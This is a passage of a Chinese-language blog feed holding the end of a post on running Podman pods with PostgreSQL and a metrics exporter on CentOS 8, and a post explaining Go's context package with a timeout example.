COMMAND               CREATED        STATUS            PORTS                                           NAMES</span><br><span class="line">f1197be2aa8b  docker.io/wrouesnel/postgres_exporter:latest                   /postgres_exporte...  4 minutes ago  Up 4 minutes ago                                                  quizzical_mcclintock</span><br><span class="line">bb00b1087b3e  docker.io/library/postgres:latest                              docker-entrypoint...  4 minutes ago  Up 4 minutes ago                                                  kind_spence</span><br><span class="line">5f38e2d70484  registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.1                        5 minutes ago  Up 5 minutes ago  0.0.0.0:5432-&gt;5432/tcp, 0.0.0.0:9187-&gt;9187/tcp  17020cd16ae6-infra</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ curl localhost:9187/metrics                                                                                                                                 </span><br><span class="line"><span class="comment"># HELP go_gc_duration_seconds A summary of the GC invocation durations.</span></span><br><span class="line"><span class="comment"># TYPE go_gc_duration_seconds summary</span></span><br><span class="line">go_gc_duration_seconds&#123;quantile=<span class="string">"0"</span>&#125; 0</span><br><span class="line">go_gc_duration_seconds&#123;quantile=<span class="string">"0.25"</span>&#125; 0</span><br><span class="line">go_gc_duration_seconds&#123;quantile=<span class="string">"0.5"</span>&#125; 0</span><br><span class="line">go_gc_duration_seconds&#123;quantile=<span class="string">"0.75"</span>&#125; 0</span><br><span class="line">go_gc_duration_seconds&#123;quantile=<span class="string">"1"</span>&#125; 0</span><br><span class="line">go_gc_duration_seconds_sum 0</span><br></pre></td></tr></table></figure><p>可以看到已经正确的获取到了相应 metrics 数值，可以通过 <code>podman pod top</code> 来获取当前进程状态：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman pod top postgresql             </span><br><span class="line">USER                PID   PPID   %CPU    ELAPSED           TTY   TIME   COMMAND</span><br><span class="line">0                   1     0      0.000   6m15.74147022s    ?     0s     /pause </span><br><span class="line">postgres            1     0      0.000   5m45.755275073s   ?     0s     postgres </span><br><span class="line">postgres            51    1      0.000   5m44.755304824s   ?     0s     postgres: checkpointer    </span><br><span class="line">postgres            52    1      0.000   5m44.755329093s   ?     0s     postgres: background writer    </span><br><span class="line">postgres            53    1      0.000   5m44.755350888s   ?     0s     postgres: walwriter    </span><br><span class="line">postgres            54    1      0.000   5m44.75537351s    ?     0s     postgres: logical replication launcher    </span><br><span class="line">postgres_exporter   1     0      0.000   5m34.767207535s   ?     0s     /postgres_exporter</span><br></pre></td></tr></table></figure><p>在 Podman 中，可以简单的将 Pod 理解为 docker-compose 中的一组容器，并且可以通过 <code>podman pod start/stop</code> 来控制这组容器的启停：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman pod stop postgresql                                                                      </span><br><span class="line">17020cd16ae689f5d4e0f17468c67c3f9d3b8aa424d9e463dc8b187bb80bd328</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman pod ls              </span><br><span class="line">POD ID         NAME         STATUS   CREATED         <span class="comment"># OF CONTAINERS   INFRA ID</span></span><br><span class="line">17020cd16ae6   postgresql   Exited   8 minutes ago   3                 5f38e2d70484</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman pod ps </span><br><span class="line">POD ID         NAME         STATUS   CREATED         <span class="comment"># OF CONTAINERS   INFRA ID</span></span><br><span class="line">17020cd16ae6   postgresql   Exited   8 minutes ago   3                 5f38e2d70484</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ curl localhost:9187/metrics</span><br><span class="line">curl: (7) Failed to connect to localhost port 9187: Connection refused</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman pod start postgresql                                                                                                                                                                            7 ↵</span><br><span class="line">17020cd16ae689f5d4e0f17468c67c3f9d3b8aa424d9e463dc8b187bb80bd328</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ curl localhost:9187/metrics      </span><br><span class="line"><span class="comment"># HELP go_gc_duration_seconds A summary of the GC invocation durations.</span></span><br><span class="line"><span class="comment"># TYPE go_gc_duration_seconds summary</span></span><br><span class="line">go_gc_duration_seconds&#123;quantile=<span class="string">"0"</span>&#125; 0</span><br><span class="line">go_gc_duration_seconds&#123;quantile=<span class="string">"0.25"</span>&#125; 0</span><br><span class="line">go_gc_duration_seconds&#123;quantile=<span class="string">"0.5"</span>&#125; 0</span><br></pre></td></tr></table></figure><h5 id="k8s-联动"><a href="#k8s-联动" class="headerlink" title="k8s 联动"></a>k8s 联动</h5><p>通过 <code>podman generate</code> 命令可以生成 k8s 可用的 YAML 文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">020cd16ae689f5d4e0f17468c67c3f9d3b8aa424d9e463dc8b187bb80bd328</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman generate kube postgresql &gt; postgresql.yaml</span><br><span class="line">no matching entries <span class="keyword">in</span> passwd file</span><br></pre></td></tr></table></figure><p>嗯，又遇到了一个错误，在 Github 上有看到相关 issue，先忽略吧。</p><p>使用 <code>podman play</code> 命令可以直接创建完整的 Pod 及其所拥有的容器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">podman play kube postgresql.yaml</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>如果从 Docker 迁移过来，有以下几点很纠结：</p><ol><li>说好的 rootless，但是如果你想要进行端口映射，那么还是要老老实实 sudo 的</li><li>虽然 systemd 大法好，但是如果 container 直接被删除了，我要单独的管理 systemd service 配置文件（貌似可以通过 OCI hook 实现</li><li>更新真的太快了</li><li>…</li></ol><p>很多同学都在说 <code>学不动了</code>，纠结归纠结，学还是要学的，说不定最后 <strong>真香</strong> 了呢。</p><p>上述所有功能示例都可以通过官方 Demo 项目运行：<a href="https://github.com/containers/Demos/blob/master/podman_cli/README.md。" target="_blank" rel="noopener">https://github.com/containers/Demos/blob/master/podman_cli/README.md。</a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://podman.io/blogs/" target="_blank" rel="noopener">https://podman.io/blogs/</a></li><li><a href="https://podman.io/blogs/2018/10/03/podman-remove-content-homedir.html" target="_blank" rel="noopener">https://podman.io/blogs/2018/10/03/podman-remove-content-homedir.html</a></li><li><a href="https://www.redhat.com/sysadmin/rootless-podman" target="_blank" rel="noopener">https://www.redhat.com/sysadmin/rootless-podman</a></li><li><a href="https://mkdev.me/en/posts/dockerless-part-3-moving-development-environment-to-containers-with-podman" target="_blank" rel="noopener">https://mkdev.me/en/posts/dockerless-part-3-moving-development-environment-to-containers-with-podman</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;CentOS8 在9月24号正式 Release 了，比 RHEL8 要推迟了4个月。这次的更新感觉比 CentOS7 的更新要来的重要，内
      
    
    </summary>
    
    
      <category term="Linux" scheme="https://zdyxry.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Golang context 使用</title>
    <link href="https://zdyxry.github.io/2019/09/30/Golang-context-%E4%BD%BF%E7%94%A8/"/>
    <id>https://zdyxry.github.io/2019/09/30/Golang-context-使用/</id>
    <published>2019-09-30T10:33:32.000Z</published>
    <updated>2019-10-01T12:38:12.548Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>前段时间在写 Cluster API Provider 的时候，经常会使用 context 传递参数，当时只是按照其他项目中的方式快速的实现，并没有认真的了解 context 具体包含什么，为了解决什么问题，这次来聊一下。</p><p>P.S. 虽然写了一周的 Golang，但是对于标准库有什么还一无所知，找时间应该认真过一遍的。。</p><h2 id="定义与使用"><a href="#定义与使用" class="headerlink" title="定义与使用"></a>定义与使用</h2><p>先看定义：</p><blockquote><p>Package context defines the Context type, which carries deadlines, cancellation signals, and other request-scoped values across API boundaries and between processes.</p></blockquote><ul><li>当一个 goroutine 调用其他 goroutine，随着层级变多，我们想要在外层达到控制的效果</li><li>在必要场景下传递 <strong>必需</strong> 的数据</li></ul><p>其中 <code>Context</code> 这个 interface 中定义了 4 个方法，具体如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Context <span class="keyword">interface</span> &#123;</span><br><span class="line">Deadline() (deadline time.Time, ok <span class="keyword">bool</span>)</span><br><span class="line">Done() &lt;-<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line">Err() error</span><br><span class="line">Value(key <span class="keyword">interface</span>&#123;&#125;) <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 <code>context</code> 包中实现了4个函数，平时也都是使用这些函数：</p><ol><li>func WithCancel(parent Context) (ctx Context, cancel CancelFunc) </li><li>func WithDeadline(parent Context, d time.Time) (Context, CancelFunc)</li><li>func WithTimeout(parent Context, timeout time.Duration) (Context, CancelFunc)</li><li>func WithValue(parent Context, key, val interface{}) Context</li></ol><p>可以看到 Cancel,Deadline,Timeout 都会返回一个 CancelFunc 函数，哪怕我们设定的时间还没到，我们也可以直接使用 CancelFunc 去设置 Context。</p><p>在 context 使用上有官方文档，且有很多博主已经写过很详细的博客，这里只是列一个简单的例子：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"context"</span></span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"time"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// Pass a context with a timeout to tell a blocking function that it</span></span><br><span class="line"><span class="comment">// should abandon its work after the timeout elapses.</span></span><br><span class="line">ctx, cancel := context.WithTimeout(context.Background(), <span class="number">200</span>*time.Millisecond)</span><br><span class="line"><span class="keyword">defer</span> cancel()</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-time.After(<span class="number">1</span> * time.Second): <span class="comment">// 等待 1s</span></span><br><span class="line">fmt.Println(<span class="string">"overslept"</span>)</span><br><span class="line"><span class="keyword">case</span> &lt;-ctx.Done():  <span class="comment">// 只有当 Channel 关闭时才会返回非空，也就是到了设定的 Timeout 数值</span></span><br><span class="line">fmt.Println(ctx.Err()) <span class="comment">// prints "context deadline exceeded"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ol><li>不要把 Context 放到结构体中，以参数传递，在作为参数传递时，需要将其作为第一个参数传递</li><li>如果 Context 传递内容不确定，那么可以传递 <code>context.Background()</code> 或 <code>context.TODO()</code>，不要传递 nil</li><li>不建议使用 <code>context.Value</code> 传递数据</li><li>Context 是通过 <strong>通知</strong> 来达到 <strong>控制</strong> 目的</li><li>Context 并非是全局的，只查询自身及父context 的数据，同理在 Cancel 也是一样的</li></ol><h2 id="（可能存在的）问题"><a href="#（可能存在的）问题" class="headerlink" title="（可能存在的）问题"></a>（可能存在的）问题</h2><p>在搜索过程中，看到<a href="https://faiface.github.io/post/context-should-go-away-go2/" target="_blank" rel="noopener">一篇博客</a>提到了 context 的一些问题：</p><ul><li>传播性<ul><li>当我们有一个包含了100个函数的调用栈，当我们想要通过 context 来达到控制目的时，那么我们需要将 context 作为函数的第一个参数不断的传递下去。</li></ul></li><li>什么时候使用 <code>context.TODO</code> ？</li><li>context.Value 不该用<ul><li>非静态的</li><li>需要在指定功能上使用特定的 key/value</li><li>容易发生 key 冲突</li></ul></li><li>效率低下</li><li>…</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>虽然上面说了那么多，比如上面提到的不应该用 <code>context.Value</code> ，在 ClusterAPI 中有很多使用 <code>context.Value</code> 传值的地方，该用还是用嘛。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://golang.org/pkg/context/#Background" target="_blank" rel="noopener">https://golang.org/pkg/context/#Background</a></li><li><a href="https://www.flysnow.org/2017/05/12/go-in-action-go-context.html" target="_blank" rel="noopener">https://www.flysnow.org/2017/05/12/go-in-action-go-context.html</a></li><li><a href="https://deepzz.com/post/golang-context-package-notes.html" target="_blank" rel="noopener">https://deepzz.com/post/golang-context-package-notes.html</a></li><li><a href="https://zhuanlan.zhihu.com/p/34417106" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/34417106</a></li><li><a href="http://imfox.io/2017/11/28/go-context-note/" target="_blank" rel="noopener">http://imfox.io/2017/11/28/go-context-note/</a></li><li><a href="https://faiface.github.io/post/context-should-go-away-go2/" target="_blank" rel="noopener">https://faiface.github.io/post/context-should-go-away-go2/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;前段时间在写 Cluster API Provider 的时候，经常会使用 context 传递参数，当时只是按照其他项目中的方式快速的实现
      
    
    </summary>
    
    
      <category term="Golang" scheme="https://zdyxry.github.io/tags/Golang/"/>
    
  </entry>
  
</feed>
